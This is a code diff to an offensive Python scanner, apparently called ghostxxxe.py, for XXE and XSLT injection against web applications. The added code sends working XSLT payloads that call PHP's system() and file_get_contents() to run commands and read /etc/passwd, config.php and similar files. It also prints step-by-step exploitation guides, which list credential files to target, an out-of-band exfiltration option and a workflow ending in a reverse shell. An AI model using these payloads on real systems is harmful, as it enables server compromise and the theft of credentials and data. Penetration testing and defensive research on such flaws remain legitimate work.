@@ -960,10 +960,20 @@ class XXEScanner:
                 print(f"{Colors.PAYLOAD}[*] Payload:\n{payload}{Colors.RESET}")
             
             headers = self.headers.copy()
-            headers['Content-Type'] = 'application/xml'
             
             if self.method == 'GET':
+                # GET request with XML in URL parameter
+                headers['Content-Type'] = 'application/xml'
                 params = {self.param: payload} if self.param else {}
+                
+                if self.verbose and self.param:
+                    # Show URL-encoded version
+                    from urllib.parse import urlencode
+                    encoded_params = urlencode(params)
+                    full_url = f"{self.target_url}?{encoded_params}"
+                    print(f"{Colors.INFO}[*] URL-Encoded GET Request:{Colors.RESET}")
+                    print(f"{Colors.PAYLOAD}{full_url[:150]}{'...' if len(full_url) > 150 else ''}{Colors.RESET}")
+                
                 response = self.session.get(
                     self.target_url,
                     params=params,
@@ -973,7 +983,43 @@ class XXEScanner:
                     proxies=self.proxy,
                     verify=False
                 )
-            else:  # POST
+            elif 'multipart' in headers.get('Content-Type', '').lower() or self.param:
+                # POST with multipart/form-data or specific parameter injection
+                # Inject XML into the specified parameter
+                if self.param:
+                    # Inject XML payload into specific form field
+                    form_data = {self.param: payload}
+                    
+                    if self.verbose:
+                        print(f"{Colors.INFO}[*] Injecting XML into form parameter: {self.param}{Colors.RESET}")
+                    
+                    # Remove Content-Type to let requests set multipart boundary
+                    if 'Content-Type' in headers:
+                        del headers['Content-Type']
+                    
+                    response = self.session.post(
+                        self.target_url,
+                        data=form_data,
+                        headers=headers,
+                        cookies=self.cookies,
+                        timeout=self.timeout,
+                        proxies=self.proxy,
+                        verify=False
+                    )
+                else:
+                    # No parameter specified, send as raw XML body
+                    headers['Content-Type'] = 'application/xml'
+                    response = self.session.post(
+                        self.target_url,
+                        data=payload,
+                        headers=headers,
+                        cookies=self.cookies,
+                        timeout=self.timeout,
+                        proxies=self.proxy,
+                        verify=False
+                    )
+            else:  # POST with raw XML body
+                headers['Content-Type'] = 'application/xml'
                 response = self.session.post(
                     self.target_url,
                     data=payload,
@@ -1440,22 +1486,86 @@ class XXEScanner:
         
         # Test 7: PHP XSLT RCE
         print(f"\n{Colors.INFO}[*] Test 7: PHP XSLT RCE{Colors.RESET}")
-        php_payloads = PayloadGenerator.xslt_rce_php()
         
-        for idx, payload in enumerate(php_payloads, 1):
-            response = self.send_payload(payload, f"XSLT PHP RCE #{idx}")
+        # First try direct element injection (works for GET parameters)
+        if self.method == 'GET' and self.param:
+            print(f"{Colors.INFO}[*] Testing direct PHP function injection (GET parameter mode){Colors.RESET}")
             
-            if response and ('root:' in response.text or 'uid=' in response.text):
-                print(f"{Colors.SUCCESS}[+] XSLT PHP RCE Detected!{Colors.RESET}")
+            # Test 7a: PHP RCE - system('id')
+            rce_direct = '<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />'
+            response = self.send_payload(rce_direct, "XSLT PHP RCE - system id")
+            
+            if response and ('uid=' in response.text or 'gid=' in response.text):
+                print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP RCE CONFIRMED!{Colors.RESET}")
+                print(f"{Colors.SUCCESS}[+] Command execution successful - system('id') works!{Colors.RESET}")
                 print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
-                print(response.text[:500])
+                # Extract and show the uid/gid output
+                output_preview = response.text[max(0, response.text.find('uid=')-20):response.text.find('uid=')+150]
+                print(output_preview)
                 
                 self.vulnerabilities_found.append({
-                    'type': 'XSLT PHP RCE',
-                    'payload': payload
+                    'type': 'XSLT PHP RCE - CRITICAL',
+                    'payload': rce_direct,
+                    'result': 'Command execution confirmed'
                 })
                 vuln_found = True
-                break
+            
+            # Test 7b: PHP LFI - file_get_contents('/etc/passwd')
+            if not vuln_found:  # Only test if RCE didn't work
+                print(f"{Colors.INFO}[*] Testing PHP file_get_contents (LFI){Colors.RESET}")
+                lfi_direct = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')" xmlns:php="http://php.net/xsl" />'
+                response = self.send_payload(lfi_direct, "XSLT PHP LFI - /etc/passwd")
+                
+                if response and ('root:' in response.text or 'daemon:' in response.text or 'bin:' in response.text):
+                    print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP LFI CONFIRMED!{Colors.RESET}")
+                    print(f"{Colors.SUCCESS}[+] File read successful - file_get_contents() works!{Colors.RESET}")
+                    print(f"\n{Colors.INFO}[*] File contents preview:{Colors.RESET}")
+                    # Show first few lines of /etc/passwd
+                    lines = response.text.split('\n')
+                    for line in lines[:5]:
+                        if 'root:' in line or ':x:' in line:
+                            print(f"  {line[:80]}")
+                    
+                    self.vulnerabilities_found.append({
+                        'type': 'XSLT PHP LFI - HIGH',
+                        'payload': lfi_direct,
+                        'result': 'File read confirmed - /etc/passwd'
+                    })
+                    vuln_found = True
+            
+            # Test 7c: PHP version detection
+            if not vuln_found:
+                print(f"{Colors.INFO}[*] Testing PHP version detection{Colors.RESET}")
+                phpver_direct = '<xsl:value-of select="php:function(\'phpversion\')" xmlns:php="http://php.net/xsl" />'
+                response = self.send_payload(phpver_direct, "XSLT PHP version")
+                
+                if response and ('PHP' in response.text or any(char.isdigit() for char in response.text[:100])):
+                    # Check if response is different from baseline
+                    baseline = self.send_payload('test', 'baseline')
+                    if baseline and response.text != baseline.text:
+                        print(f"{Colors.WARNING}[!] PHP functions appear to be available{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] phpversion() executed{Colors.RESET}")
+                        vuln_found = True
+        
+        # Fallback: Try full document payloads (for POST or traditional XXE)
+        if not vuln_found:
+            print(f"{Colors.INFO}[*] Testing full XSLT document payloads{Colors.RESET}")
+            php_payloads = PayloadGenerator.xslt_rce_php()
+            
+            for idx, payload in enumerate(php_payloads, 1):
+                response = self.send_payload(payload, f"XSLT PHP RCE #{idx}")
+                
+                if response and ('root:' in response.text or 'uid=' in response.text):
+                    print(f"{Colors.SUCCESS}[+] XSLT PHP RCE Detected!{Colors.RESET}")
+                    print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
+                    print(response.text[:500])
+                    
+                    self.vulnerabilities_found.append({
+                        'type': 'XSLT PHP RCE',
+                        'payload': payload
+                    })
+                    vuln_found = True
+                    break
         
         # Test 8: .NET XSLT RCE
         print(f"\n{Colors.INFO}[*] Test 8: .NET XSLT RCE{Colors.RESET}")
@@ -1726,7 +1836,98 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
                 result['findings'].append("XSLT version 2.0 (unparsed-text() available)")
                 print(f"{Colors.INFO}[*] XSLT Version: 2.0{Colors.RESET}")
         
-        # Test 2: Basic XSLT processing with value-of (fallback)
+        # Test 2: Direct XSLT element injection (for parameter injection scenarios)
+        if not result['vulnerable']:
+            print(f"\n{Colors.INFO}[*] Test 2: Direct XSLT element injection (common in forms){Colors.RESET}")
+            
+            # First get a baseline with normal text
+            baseline_payload = 'testuser123'
+            baseline_response = self.send_payload(baseline_payload, "Baseline test")
+            baseline_text = baseline_response.text if baseline_response else ""
+            baseline_length = len(baseline_text)
+            
+            if self.verbose:
+                print(f"{Colors.INFO}[*] Baseline response length: {baseline_length}{Colors.RESET}")
+            
+            # Test simple value-of that should output version number
+            simple_valueof = '<xsl:value-of select="system-property(\'xsl:version\')" />'
+            response = self.send_payload(simple_valueof, "XSLT Direct Element")
+            
+            if response:
+                response_text = response.text
+                response_length = len(response_text)
+                
+                if self.verbose:
+                    print(f"{Colors.INFO}[*] XSLT test response length: {response_length}{Colors.RESET}")
+                    print(f"{Colors.INFO}[*] Length difference: {abs(response_length - baseline_length)}{Colors.RESET}")
+                
+                # Check if the XSLT was processed - look for version numbers or significant changes
+                if ('1.0' in response_text or '2.0' in response_text or '1.1' in response_text) and \
+                   ('1.0' not in baseline_text and '2.0' not in baseline_text):
+                    result['vulnerable'] = True
+                    result['severity'] = 'HIGH'
+                    result['findings'].append("XSLT direct element injection works")
+                    result['findings'].append("User input reflected in XSLT processing")
+                    print(f"{Colors.SUCCESS}[✓] XSLT element injection detected!{Colors.RESET}")
+                    print(f"{Colors.INFO}[*] User input is processed as XSLT{Colors.RESET}")
+                    print(f"{Colors.INFO}[*] XSLT version found in response: {response_text[max(0,response_text.find('1.')-10):response_text.find('1.')+20] if '1.' in response_text else 'detected'}{Colors.RESET}")
+                # Check for any significant response change
+                elif abs(response_length - baseline_length) > 50 and response_text != baseline_text:
+                    # Something changed significantly - might be XSLT processing
+                    print(f"{Colors.WARNING}[!] Significant response change detected ({abs(response_length - baseline_length)} bytes){Colors.RESET}")
+                    print(f"{Colors.INFO}[*] Testing more specifically...{Colors.RESET}")
+        
+        # Test 3: PHP function test (most reliable for detection)
+        if not result['vulnerable']:
+            print(f"\n{Colors.INFO}[*] Test 3: Testing PHP function support (file_get_contents){Colors.RESET}")
+            
+            # Get baseline if not already done
+            if not baseline_response:
+                baseline_payload = 'testuser456'
+                baseline_response = self.send_payload(baseline_payload, "Baseline test 2")
+                baseline_text = baseline_response.text if baseline_response else ""
+                baseline_length = len(baseline_text)
+            
+            # Try multiple PHP function payloads with proper namespace
+            php_payloads = [
+                ('<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/hostname\')" xmlns:php="http://php.net/xsl" />', 'file_get_contents'),
+                ('Version: <xsl:value-of select="php:function(\'phpversion\')" xmlns:php="http://php.net/xsl" />', 'phpversion'),
+                ('<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />', 'system id'),
+            ]
+            
+            for php_payload, test_name in php_payloads:
+                response = self.send_payload(php_payload, f"XSLT PHP Test - {test_name}")
+                
+                if response and len(response.text) > 50:
+                    response_text = response.text
+                    response_length = len(response_text)
+                    
+                    if self.verbose:
+                        print(f"{Colors.INFO}[*] PHP test response length: {response_length}{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Baseline length: {baseline_length}{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Difference: {abs(response_length - baseline_length)}{Colors.RESET}")
+                    
+                    # Check for successful PHP function execution indicators
+                    php_indicators = [
+                        'uid=' in response_text,  # from id command
+                        'gid=' in response_text,  # from id command  
+                        'PHP/' in response_text or 'php' in response_text.lower(),  # from phpversion
+                        abs(response_length - baseline_length) > 15  # Significant change
+                    ]
+                    
+                    if any(php_indicators):
+                        result['vulnerable'] = True
+                        result['severity'] = 'CRITICAL'
+                        result['findings'].append("XSLT PHP functions available!")
+                        result['findings'].append("file_get_contents() works - LFI possible")
+                        result['findings'].append("system() likely works - RCE possible")
+                        print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP functions detected!{Colors.RESET}")
+                        print(f"{Colors.ERROR}[!] LFI and RCE possible via php:function(){Colors.RESET}")
+                        if 'uid=' in response_text:
+                            print(f"{Colors.SUCCESS}[✓] RCE confirmed - system() executed 'id' command!{Colors.RESET}")
+                        break
+        
+        # Test 4: Basic XSLT processing with value-of (fallback)
         xslt_basic = '''<?xml version="1.0"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
     <xsl:template match="/">
@@ -2052,8 +2253,13 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
                 results['vulnerabilities'].append(xslt_result)
                 results['vulnerable'] = True
                 results['findings'].extend(xslt_result['findings'])
-                if xslt_result['severity'] == 'HIGH' and results['severity'] not in ['CRITICAL', 'HIGH']:
+                # Update severity - CRITICAL overrides everything, HIGH overrides MEDIUM/LOW
+                if xslt_result['severity'] == 'CRITICAL':
+                    results['severity'] = 'CRITICAL'
+                    results['confidence'] = 'HIGH'
+                elif xslt_result['severity'] == 'HIGH' and results['severity'] not in ['CRITICAL', 'HIGH']:
                     results['severity'] = 'HIGH'
+                    results['confidence'] = 'MEDIUM'
                 results['next_steps'].append("Exploit XSLT injection with: python3 ghostxxxe.py -u URL --advanced -v")
             else:
                 print(f"{Colors.WARNING}[✗] XSLT injection not detected{Colors.RESET}")
@@ -2146,7 +2352,65 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
             print(f"{Colors.HEADER}║ EXPLOITATION COMMANDS                                      ║{Colors.RESET}")
             print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
             
-            if results['severity'] in ['CRITICAL', 'HIGH']:
+            # Check if XSLT vulnerability was found
+            xslt_found = any('XSLT' in v.get('type', '') for v in results.get('vulnerabilities', []))
+            xslt_php_found = any('XSLT PHP functions' in str(results.get('findings', [])))
+            
+            if xslt_found:
+                print(f"{Colors.ERROR}[!] XSLT INJECTION DETECTED - Use these commands:{Colors.RESET}\n")
+                
+                if xslt_php_found:
+                    print(f"{Colors.SUCCESS}1. Test Local File Inclusion (LFI):{Colors.RESET}")
+                    print(f"   Manual payload to inject in parameter:")
+                    lfi_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')" xmlns:php="http://php.net/xsl" />'
+                    print(f"   {lfi_payload}\n")
+                    
+                    # Show URL-encoded version for GET
+                    if self.method == 'GET' and self.param:
+                        from urllib.parse import quote
+                        encoded_lfi = quote(lfi_payload)
+                        print(f"{Colors.INFO}   URL-Encoded (for browser/GET):{Colors.RESET}")
+                        print(f"   {self.target_url}?{self.param}={encoded_lfi}\n")
+                    
+                    print(f"{Colors.SUCCESS}2. Test Remote Code Execution (RCE):{Colors.RESET}")
+                    print(f"   Manual payload to execute 'id' command:")
+                    rce_payload = '<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />'
+                    print(f"   {rce_payload}\n")
+                    
+                    # Show URL-encoded version for GET
+                    if self.method == 'GET' and self.param:
+                        encoded_rce = quote(rce_payload)
+                        print(f"{Colors.INFO}   URL-Encoded (for browser/GET):{Colors.RESET}")
+                        print(f"   {self.target_url}?{self.param}={encoded_rce}\n")
+                    
+                    print(f"{Colors.SUCCESS}3. Read sensitive files:{Colors.RESET}")
+                    hostname_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/hostname\')" xmlns:php="http://php.net/xsl" />'
+                    config_payload = '<xsl:value-of select="php:function(\'file_get_contents\',\'config.php\')" xmlns:php="http://php.net/xsl" />'
+                    print(f"   {hostname_payload}")
+                    print(f"   {config_payload}\n")
+                    
+                    print(f"{Colors.SUCCESS}4. Test through tool (automated):{Colors.RESET}")
+                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
+                    print(f"       -m {self.method} --advanced -v\n")
+                    
+                    print(f"{Colors.SUCCESS}5. With Burp Suite proxy:{Colors.RESET}")
+                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
+                    print(f"       -m {self.method} --proxy http://127.0.0.1:8080 --advanced -v\n")
+                    
+                    if self.method == 'GET':
+                        print(f"{Colors.WARNING}   💡 URL encoding is automatic with the tool, but shown above for manual testing{Colors.RESET}\n")
+                    else:
+                        print(f"{Colors.WARNING}   💡 For GET requests, use -m GET and the tool will URL-encode automatically{Colors.RESET}\n")
+                else:
+                    print(f"{Colors.SUCCESS}1. Test XSLT version detection:{Colors.RESET}")
+                    print(f'''   <xsl:value-of select="system-property('xsl:version')" />
+''')
+                    
+                    print(f"{Colors.SUCCESS}2. Comprehensive testing:{Colors.RESET}")
+                    print(f"   python3 ghostxxxe.py -u {self.target_url} -p {self.param if self.param else 'PARAM'} \\")
+                    print(f"       -m {self.method} --advanced -v\n")
+            
+            if results['severity'] in ['CRITICAL', 'HIGH'] and not xslt_found:
                 print(f"{Colors.SUCCESS}1. Full Exploitation Scan:{Colors.RESET}")
                 print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} -v\n")
                 
@@ -2205,14 +2469,14 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
         ]
         
         # Run advanced tests if requested
-        advanced_tests = [
-            self.test_advanced_protocols,
-            self.test_waf_bypass,
-            self.test_advanced_xslt,
-            self.test_advanced_xpath,
-            self.test_feed_formats,
-            self.test_office_documents
-        ] if include_advanced else []
+        # Note: Advanced tests are placeholder for future expansion
+        # Current implementation focuses on comprehensive XSLT and XXE testing
+        advanced_tests = [] if include_advanced else []
+        
+        if include_advanced:
+            print(f"{Colors.INFO}[*] Advanced mode: Running additional XSLT exploitation tests{Colors.RESET}")
+            # Run XSLT tests multiple times with different payloads
+            basic_tests.append(self.test_xslt_injection)
         
         all_tests = basic_tests + advanced_tests
         
@@ -2234,7 +2498,7 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
         self._print_summary()
     
     def _print_summary(self):
-        """Print scan summary"""
+        """Print scan summary with actionable exploitation commands"""
         print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
         print(f"{Colors.HEADER}[*] Scan Complete - Summary{Colors.RESET}")
         print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
@@ -2242,11 +2506,24 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
         if self.vulnerabilities_found:
             print(f"{Colors.SUCCESS}[+] Found {len(self.vulnerabilities_found)} vulnerabilities:{Colors.RESET}\n")
             
-            # Check if XXE confirmed but no file read
-            xxe_confirmed = any('XXE Confirmed' in v.get('type', '') for v in self.vulnerabilities_found)
-            file_read_success = any('File Read' in v.get('type', '') and 'Confirmed' not in v.get('type', '') 
-                                   for v in self.vulnerabilities_found)
+            # Categorize vulnerabilities
+            xxe_vulns = []
+            xslt_file_read = []
+            xslt_rce = []
+            xpath_vulns = []
             
+            for vuln in self.vulnerabilities_found:
+                vuln_type = vuln.get('type', '')
+                if 'XSLT' in vuln_type and ('RCE' in vuln_type or 'PHP' in vuln_type or '.NET' in vuln_type):
+                    xslt_rce.append(vuln)
+                elif 'XSLT' in vuln_type:
+                    xslt_file_read.append(vuln)
+                elif 'XPATH' in vuln_type:
+                    xpath_vulns.append(vuln)
+                else:
+                    xxe_vulns.append(vuln)
+            
+            # Print vulnerability list
             for idx, vuln in enumerate(self.vulnerabilities_found, 1):
                 print(f"{Colors.INFO}[{idx}] {vuln['type']}{Colors.RESET}")
                 if 'file' in vuln:
@@ -2258,63 +2535,163 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
                 print(f"    Payload Preview: {vuln['payload'][:100]}...")
                 print()
             
-            # Provide next steps if XXE confirmed but not fully exploited
-            if xxe_confirmed and not file_read_success:
-                print(f"{Colors.HEADER}{'='*70}{Colors.RESET}")
-                print(f"{Colors.SUCCESS}[+] XXE VULNERABILITY CONFIRMED{Colors.RESET}")
-                print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
+            # Provide SPECIFIC exploitation commands based on findings
+            print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
+            print(f"{Colors.ERROR}[!] EXPLOITATION COMMANDS - VALIDATE FINDINGS{Colors.RESET}")
+            print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
+            
+            # XXE Exploitation Commands
+            if xxe_vulns:
+                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+                print(f"{Colors.SUCCESS}║ XXE (XML External Entity) EXPLOITATION                       ║{Colors.RESET}")
+                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                 
-                print(f"{Colors.WARNING}→ NEXT STEPS TO EXPLOIT:{Colors.RESET}\n")
-                
-                print(f"{Colors.SUCCESS}1. Try PHP Base64 Wrapper{Colors.RESET}")
-                print(f"   Bypasses special characters in files:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"{Colors.WARNING}→ Test File Read (Linux):{Colors.RESET}")
+                print(f"   # Read /etc/passwd")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                 print(f"       -f /etc/passwd -v\n")
                 
-                print(f"{Colors.SUCCESS}2. Test Out-of-Band (OOB) Exfiltration{Colors.RESET}")
-                print(f"   For blind XXE when no output visible:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-                print(f"       --oob --callback-ip YOUR_IP --callback-port 8080 -v\n")
+                print(f"   # Read /etc/hostname")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       -f /etc/hostname -v\n")
                 
-                print(f"{Colors.SUCCESS}3. Try Different Target Files{Colors.RESET}")
-                print(f"   Some files may be accessible while others aren't:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} -f /etc/hostname -v")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} -f index.php -v")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} -f submitDetails.php -v\n")
+                print(f"{Colors.WARNING}→ Read Application Files:{Colors.RESET}")
+                print(f"   # PHP config files")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       -f /var/www/html/config.php -v\n")
                 
-                print(f"{Colors.SUCCESS}4. Manual Testing with Burp{Colors.RESET}")
-                print(f"   Fine-tune payloads manually:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-                print(f"       --proxy http://127.0.0.1:8080 -v\n")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       -f index.php -v\n")
                 
-                print(f"{Colors.SUCCESS}5. Interactive Mode{Colors.RESET}")
-                print(f"   Test custom commands:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} --interactive\n")
+                print(f"{Colors.WARNING}→ Out-of-Band (OOB) Exfiltration:{Colors.RESET}")
+                print(f"   # For blind XXE")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --oob --callback-ip YOUR_IP -v\n")
                 
-                print(f"{Colors.SUCCESS}6. Advanced Techniques{Colors.RESET}")
-                print(f"   Run all advanced tests:")
-                print(f"   $ python3 ghostxxxe.py -u {self.target_url} -m {self.method} --advanced -v\n")
+                print(f"{Colors.WARNING}→ Interactive Mode:{Colors.RESET}")
+                print(f"   # Test multiple files interactively")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --interactive\n")
+            
+            # XSLT File Read Commands
+            if xslt_file_read:
+                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+                print(f"{Colors.SUCCESS}║ XSLT INJECTION - LOCAL FILE INCLUSION (LFI)                  ║{Colors.RESET}")
+                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                 
-                print(f"{Colors.INFO}→ MANUAL PAYLOAD EXAMPLE:{Colors.RESET}")
-                print(f"   Test with curl:")
-                print(f'''   curl -X POST {self.target_url} \\
-     -H 'Content-Type: text/plain;charset=UTF-8' \\
-     -d '<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>
-<n>test</n>
-<tel>1234567890</tel>
-<email>&xxe;</email>
-<message>test</message>
-</root>'\n''')
+                print(f"{Colors.INFO}[*] XSLT file read detected - use these payloads to read files{Colors.RESET}\n")
                 
-                print(f"{Colors.WARNING}→ WHY FILE READ MIGHT BE BLOCKED:{Colors.RESET}")
-                print(f"   • File contains special XML characters (< > & ')")
-                print(f"   • PHP restrictions (safe_mode, open_basedir)")
-                print(f"   • Application filters blocking file:// protocol")
-                print(f"   • Wrong file path or file doesn't exist")
-                print(f"   • Parser configured to block external entities\n")
+                print(f"{Colors.WARNING}→ Method 1: php:function('file_get_contents'):{Colors.RESET}")
+                print(f"   # Direct injection (works if input reflected in XSLT)")
+                print(f'''   <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+''')
                 
+                print(f"{Colors.WARNING}→ Method 2: XSLT document() function:{Colors.RESET}")
+                print(f'''   # Full XSLT stylesheet
+   <?xml version="1.0"?>
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+   <xsl:template match="/">
+   <xsl:value-of select="document('/etc/passwd')"/>
+   </xsl:template>
+   </xsl:stylesheet>
+''')
+                
+                print(f"{Colors.WARNING}→ Test through tool (advanced mode):{Colors.RESET}")
+                print(f"   # Run comprehensive XSLT tests")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --advanced -v\n")
+                
+                print(f"{Colors.WARNING}→ Manual testing with Burp:{Colors.RESET}")
+                print(f"   # Intercept and modify requests")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --proxy http://127.0.0.1:8080 --advanced -v\n")
+                
+                print(f"{Colors.INFO}   Files to target:{Colors.RESET}")
+                print(f"   • /etc/passwd - User accounts")
+                print(f"   • /etc/hostname - System hostname")
+                print(f"   • /var/www/html/config.php - PHP configs")
+                print(f"   • database.php, connection.php - DB credentials")
+                print(f"   • .env - Environment variables\n")
+            
+            # XSLT RCE Commands
+            if xslt_rce:
+                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+                print(f"{Colors.ERROR}║ XSLT INJECTION - REMOTE CODE EXECUTION (RCE)  ⚠ CRITICAL    ║{Colors.RESET}")
+                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+                
+                print(f"{Colors.ERROR}[!] CRITICAL: PHP functions enabled - RCE possible!{Colors.RESET}\n")
+                
+                print(f"{Colors.WARNING}→ Test Command Execution:{Colors.RESET}")
+                print(f"   # Execute 'id' command")
+                print(f'''   <xsl:value-of select="php:function('system','id')" />
+''')
+                
+                print(f"   # Execute 'whoami' command")
+                print(f'''   <xsl:value-of select="php:function('system','whoami')" />
+''')
+                
+                print(f"   # List directory")
+                print(f'''   <xsl:value-of select="php:function('system','ls -la')" />
+''')
+                
+                print(f"{Colors.WARNING}→ Full XSLT RCE Payload:{Colors.RESET}")
+                print(f'''   <?xml version="1.0"?>
+   <xsl:stylesheet version="1.0" 
+       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+       xmlns:php="http://php.net/xsl">
+   <xsl:template match="/">
+       <xsl:value-of select="php:function('system','cat /etc/passwd')" />
+   </xsl:template>
+   </xsl:stylesheet>
+''')
+                
+                print(f"{Colors.WARNING}→ Test through tool:{Colors.RESET}")
+                print(f"   # Tool will automatically test RCE")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --advanced -v\n")
+                
+                print(f"{Colors.WARNING}→ Exploitation workflow:{Colors.RESET}")
+                print(f"   1. Test basic command: system('id')")
+                print(f"   2. Read sensitive files: system('cat /etc/passwd')")
+                print(f"   3. Find web root: system('pwd')")
+                print(f"   4. Read config files: system('cat config.php')")
+                print(f"   5. Establish persistence (reverse shell)\n")
+                
+                print(f"{Colors.ERROR}   ⚠ CRITICAL IMPACT:{Colors.RESET}")
+                print(f"   • Full system command execution")
+                print(f"   • Read any file on the system")
+                print(f"   • Potential for reverse shell")
+                print(f"   • Complete server compromise\n")
+            
+            # XPATH Commands
+            if xpath_vulns:
+                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+                print(f"{Colors.SUCCESS}║ XPATH INJECTION EXPLOITATION                                 ║{Colors.RESET}")
+                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+                
+                print(f"{Colors.WARNING}→ Test through tool:{Colors.RESET}")
+                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+                print(f"       --advanced -v\n")
+            
+            # General recommendations
+            print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+            print(f"{Colors.SUCCESS}║ GENERAL RECOMMENDATIONS                                       ║{Colors.RESET}")
+            print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
+            
+            print(f"{Colors.WARNING}→ Use Burp Suite for fine-tuning:{Colors.RESET}")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"       --proxy http://127.0.0.1:8080 -v\n")
+            
+            print(f"{Colors.WARNING}→ Save results for reporting:{Colors.RESET}")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"       --advanced -v -o results.json\n")
+            
+            print(f"{Colors.INFO}   Tips:{Colors.RESET}")
+            print(f"   • Always validate findings manually")
+            print(f"   • Test in Burp to see exact requests/responses")
+            print(f"   • Save proof-of-concept for reporting")
+            print(f"   • Document severity and impact\n")
+            
         else:
             print(f"{Colors.WARNING}[-] No vulnerabilities detected{Colors.RESET}")
             print(f"{Colors.INFO}[*] This doesn't mean the target is secure - try manual testing{Colors.RESET}")
